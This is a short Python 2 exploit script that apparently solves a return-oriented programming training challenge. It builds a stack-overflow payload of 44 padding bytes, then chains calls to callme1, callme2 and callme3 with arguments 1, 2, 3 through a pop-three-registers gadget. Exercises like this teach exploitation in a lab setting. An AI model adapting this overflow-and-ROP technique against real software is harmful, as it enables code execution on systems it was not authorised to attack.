import struct 

def conv(x): 
    return struct.pack('<L', x) 
  
pop3ret = conv(0x80488a9) 

buf = 'A'*44 
buf += conv(0x080485c0) #callme1 
buf += pop3ret 
buf += conv(0x1) 
buf += conv(0x2) 
buf += conv(0x3) 
buf += conv(0x08048620) #callme2 
buf += pop3ret 
buf += conv(0x1) 
buf += conv(0x2) 
buf += conv(0x3) 
buf += conv(0x080485b0) #callme3 
buf += 'AAAA' 
buf += conv(0x1) 
buf += conv(0x2) 
buf += conv(0x3) 
print buf
